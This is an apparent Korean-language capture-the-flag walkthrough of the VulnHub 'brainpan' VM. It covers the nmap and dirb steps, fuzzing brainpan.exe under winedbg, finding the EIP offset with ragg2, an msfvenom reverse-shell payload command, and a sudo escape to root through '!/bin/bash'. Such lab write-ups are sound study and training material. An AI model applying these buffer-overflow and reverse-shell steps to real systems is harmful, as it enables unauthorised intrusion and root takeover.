[brainpan](https://www.vulnhub.com/entry/brainpan-1,51/)

# targetdiscovery
***
### nmap -sn 192.168.25.8-255 --open
![1](https://user-images.githubusercontent.com/69203345/111068822-abe65480-850d-11eb-9bfd-72b1fe3c3e10.PNG)

# enumerate + exploitation
***
## target: 192.168.25.16
### nmap -O -sV -sS -p- 192.168.25.16
![2](https://user-images.githubusercontent.com/69203345/111068931-11d2dc00-850e-11eb-8690-8710e9038372.PNG)
#### 192.168.25.16:10000
![3](https://user-images.githubusercontent.com/69203345/111068962-329b3180-850e-11eb-8f82-ae5384806dde.PNG)
### dirb ://192.168.25.16:10000
![4](https://user-images.githubusercontent.com/69203345/111068991-51012d00-850e-11eb-8c16-c8f80a7e91d8.PNG)     
192.168.25.16:10000/bin/      
![5](https://user-images.githubusercontent.com/69203345/111069014-6bd3a180-850e-11eb-99c4-8d39de61e073.PNG)      
### winedbg brainpan.exe 하고 c눌러서 일시정지
![6](https://user-images.githubusercontent.com/69203345/111069203-557a1580-850f-11eb-86e2-659de800db0d.PNG)     
된 상태로     
### python fuzz.py실행 
fuzz.py 코드    
![7](https://user-images.githubusercontent.com/69203345/111069296-b9044300-850f-11eb-978b-287f12ec751c.PNG)         
python fuzz.py 실행후 fuzz.py상태와 winedbg 상태 확인      
![8](https://user-images.githubusercontent.com/69203345/111069342-fcf74800-850f-11eb-8342-16d863d9b7de.PNG)            
![9](https://user-images.githubusercontent.com/69203345/111069364-113b4500-8510-11eb-9769-8ed06323ad36.PNG)       
EIP와 ESP확인      
껏다가 똑같이 다시 킴     
#### ragg2 -P 9999 -r | nc ip port
![10](https://user-images.githubusercontent.com/69203345/111069969-e0a8da80-8512-11eb-844a-98482c638734.PNG)     
EIP오프셋 검색 
#### ragg2 -q 0x43413243
![11](https://user-images.githubusercontent.com/69203345/111070031-29f92a00-8513-11eb-8783-bc5e6707955a.PNG)       
524 화인됐으니 간단한 패이로드 하나 만들어서 ragg2 -P 524 -r -C payload.txt | nc ip port  해주자    
![12](https://user-images.githubusercontent.com/69203345/111070164-9f64fa80-8513-11eb-81d4-6f5b6c904efb.PNG)      
실행했을때 winedbg 상태     
![13](https://user-images.githubusercontent.com/69203345/111070198-d0452f80-8513-11eb-9d5d-38b6a677888a.PNG)       
111122223333이 ESP영역까지 들어와 있는것을 볼 수 있다.      
r2 brainpan.exe 실행후 /ad/로 jmp esp 검색      
![14](https://user-images.githubusercontent.com/69203345/111070362-c7089280-8514-11eb-9979-88b24a0379b1.PNG)    
#### msfvenom -p linux/x86/shell_reverse_tcp LHOST=ip LPORT=port -b "\x00" -f python
![15](https://user-images.githubusercontent.com/69203345/111070823-cec93680-8516-11eb-8e11-c6fb70b8368c.PNG)          
esp위치와 리버스 쉘 eip의 크기를 이용해서 스크립트 작성       
![16](https://user-images.githubusercontent.com/69203345/111070904-249dde80-8517-11eb-8278-b850724ec74b.PNG)     
### python 만든 스크립트 파일 실행
![17](https://user-images.githubusercontent.com/69203345/111071279-c2de7400-8518-11eb-90c0-71da2c775d61.PNG)       

# privilege escalation 
***   
### sudo -l
![18](https://user-images.githubusercontent.com/69203345/111071559-0f767f00-851a-11eb-8547-307894ad8c7b.PNG)      
sudo /home/anansi/bin/anansi_util manual file      
!/bin/bash     
![19](https://user-images.githubusercontent.com/69203345/111071609-51072a00-851a-11eb-8edd-ec37a731337b.PNG)


ㄲ-ㅌ

root획득   
꼭 이방법만 있는것은 아니다.
으악.
***
https://blog.lab26.net/vulnerable-vm-walkthrough-brainpan-1-buffer-overflow/       
ragg2 를 사용해서 쉘코드 생성에 도움.      
https://security.stackexchange.com/questions/182458/why-would-legitimate-programs-have-a-jmp-esp-instruction/182588#182588       
